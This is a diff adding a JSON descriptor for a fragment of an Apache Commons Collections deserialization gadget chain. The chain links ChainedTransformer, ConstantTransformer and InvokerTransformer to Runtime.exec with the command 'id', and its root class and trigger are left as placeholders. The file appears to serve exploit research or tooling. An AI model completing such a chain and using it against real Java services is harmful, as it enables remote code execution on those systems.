@@ -1,0 +1,31 @@
+{
+  "chain_type": "Fragment: ChainedTransformer link (ConstantTransformer→InvokerTransformer)",
+  "root_class": "PLACEHOLDER_ROOT",
+  "root_trigger": "PLACEHOLDER",
+  "links": [
+    {
+      "class": "org.apache.commons.collections.functors.ChainedTransformer",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:1"},
+          {"$ref": "link:2"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": {
+        "iConstant": "java.lang.Runtime"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "exec",
+        "iParamTypes": ["java.lang.String"],
+        "iArgs": ["id"]
+      }
+    }
+  ],
+  "sink_method": "Runtime.exec"
+}
